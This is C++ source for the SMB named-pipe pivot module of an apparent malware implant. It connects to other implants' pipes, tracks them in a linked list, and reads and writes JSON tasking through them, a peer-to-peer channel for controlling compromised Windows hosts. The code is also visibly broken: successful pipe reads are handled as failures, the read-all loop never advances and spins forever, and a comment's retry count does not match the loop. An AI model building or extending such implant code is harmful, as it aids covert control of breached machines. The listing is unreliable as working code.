#include "Implant.h"

typedef struct {
    LIST_ENTRY Entry;
    DWORD      ID;
    HANDLE     Pipe;
} SMB_IMPLANT;

LIST_ENTRY g_PivotList;

// SmbConnect()
// connect to smb implant read checking and return it
// retry 5 times
BOOL SmbConnect( const CHAR* PipeName, json& PivotResponse ) {
    HANDLE Handle      = INVALID_HANDLE_VALUE;
    DWORD  BytesToRead = 0;
    CHAR*  Response    = NULL;
    DWORD  bytesRead   = 0;
    int    i           = 0;

    for (i = 0; i < 2; i++) {
        Handle = CreateFileA( PipeName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL );
        if (Handle != INVALID_HANDLE_VALUE) {
            break;
        }

        if (GetLastError() != ERROR_PIPE_BUSY) {
            return FALSE;
        }

        WaitNamedPipeA( PipeName, 5000 );
    }

    if (Handle == INVALID_HANDLE_VALUE) {
        return FALSE;
    }

    DWORD mode = PIPE_READMODE_MESSAGE;
    if (!SetNamedPipeHandleState( Handle, &mode, NULL, NULL )) {
        printf( "[-] Failed to set pipe state. Error: %lu\n", GetLastError() );
    } else {
        printf( "[+] Pipe state set to message mode.\n" );
    }

    for (i = 0; i < 5; i++) {
        if (PeekNamedPipe( Handle, NULL, 0, NULL, &BytesToRead, NULL )) {

            if (BytesToRead > 0) {
                Response = (CHAR*)LocalAlloc( LMEM_ZEROINIT, sizeof( CHAR ) * BytesToRead );
                if (ReadFile( Handle, Response, BytesToRead, &bytesRead, NULL )) {
                    LocalFree( Response );
                    printf( "Failed to read smb implant reponse\n" );
                    return FALSE;
                }

                break;
            }
        } else {
            // Peek failed (e.g., pipe disconnected by server)
            printf( "[-] PeekNamedPipe failed. Error: %lu\n", GetLastError() );
            return FALSE;
        }

        Sleep( 200 );
    }

    json         package = json::object();
    SMB_IMPLANT* Implant = NULL;

    try {
        package       = json::parse( Response, Response + BytesToRead );
        Implant       = (SMB_IMPLANT*)LocalAlloc( LMEM_ZEROINIT, sizeof( SMB_IMPLANT ) );
        PivotResponse = package;

        printf( "[*] Response: \n%s\n\n", package.dump( 4 ).c_str() );

        Implant->ID   = package["id"].get<DWORD>();
        Implant->Pipe = Handle;
        InsertTailList( &g_PivotList, &Implant->Entry );

        return TRUE;
    } catch (const std::exception& e) {
        printf( "[-] Exception caught: %s\n", e.what() );
        return FALSE;
    }
}

static SMB_IMPLANT* GetImplant( DWORD ID ) {
    LIST_ENTRY* Current = g_PivotList.Flink;

    while (Current != &g_PivotList) {
        SMB_IMPLANT* Pivot = CONTAINING_RECORD( Current, SMB_IMPLANT, Entry );

        if (Pivot->ID == ID) {
            return Pivot;
        }

        Current = Current->Flink;
    }

    return NULL;
}

// Write to named pipe
BOOL SmbWrite( DWORD ID, CHAR* Data, DWORD Size ) {

    SMB_IMPLANT* Pivot = GetImplant( ID );
    if (Pivot == NULL) {
        printf( "[-] Failed to get implant. Error: %lu\n", GetLastError() );
        return FALSE;
    }

    DWORD BytesWritten = 0;
    if (!WriteFile( Pivot->Pipe, Data, Size, &BytesWritten, NULL )) {
        printf( "[-] Failed to write to implant. Error: %lu\n", GetLastError() );
        return FALSE;
    }

    return TRUE;
}

// Read from named pipe
BOOL SmbRead( DWORD ID, CHAR** Data, DWORD* Size ) {
    SMB_IMPLANT* Pivot = GetImplant( ID );
    if (Pivot == NULL) {
        printf( "[-] Failed to get implant. Error: %lu\n", GetLastError() );
        return FALSE;
    }

    DWORD BytesToRead = 0;
    if (PeekNamedPipe( Pivot->Pipe, NULL, 0, NULL, &BytesToRead, NULL )) {
        DWORD BytesRead = 0;
        if (BytesToRead > 0) {
            *Data = (CHAR*)LocalAlloc( LMEM_ZEROINIT, sizeof( CHAR ) * BytesToRead );
            if (ReadFile( Pivot->Pipe, *Data, BytesToRead, &BytesRead, NULL )) {
                LocalFree( *Data );
                *Data = NULL;
                *Size = 0;
                printf( "Failed to read smb implant reponse\n" );
                return FALSE;
            }

            *Size = BytesToRead;
            return TRUE;
        }

        printf( "[*] Nothing to read from pivot implant\n" );
        return FALSE;
    } else {
        printf( "[-] PeekNamedPipe failed. Error: %lu\n", GetLastError() );
        return FALSE;
    }
}

BOOL SmbReadAll( json& packages ) {
    LIST_ENTRY* Current  = g_PivotList.Flink;
    json        Packages = json::array();
    CHAR*       Data     = 0;
    DWORD       Size     = 0;

    if (!IsListEmpty( &g_PivotList )) {
        while (Current != &g_PivotList) {
            SMB_IMPLANT* Pivot       = CONTAINING_RECORD( Current, SMB_IMPLANT, Entry );
            DWORD        BytesToRead = 0;

            if (PeekNamedPipe( Pivot->Pipe, NULL, 0, NULL, &BytesToRead, NULL )) {
                DWORD BytesRead = 0;
                if (BytesToRead > 0) {
                    Data = (CHAR*)LocalAlloc( LMEM_ZEROINIT, sizeof( CHAR ) * BytesToRead );
                    if (ReadFile( Pivot->Pipe, Data, BytesToRead, &BytesRead, NULL )) {
                        LocalFree( Data );
                        printf( "Failed to read smb implant reponse\n" );
                        continue;
                    }

                    printf( "[*] Reading %d bytes\n", BytesToRead );

                    // read
                    try {
                        auto package = json::parse( Data, Data + BytesToRead );
                        packages.push_back( package );
                    } catch (const std::exception& e) {
                        printf( "[-] Exception caught: %s\n", e.what() );
                        continue;
                    }
                }

                printf( "[*] Nothing to read from pivot implant\n" );
            } else {
                printf( "[-] PeekNamedPipe failed. Error: %lu\n", GetLastError() );
            }
        }
    }

    return TRUE;
}
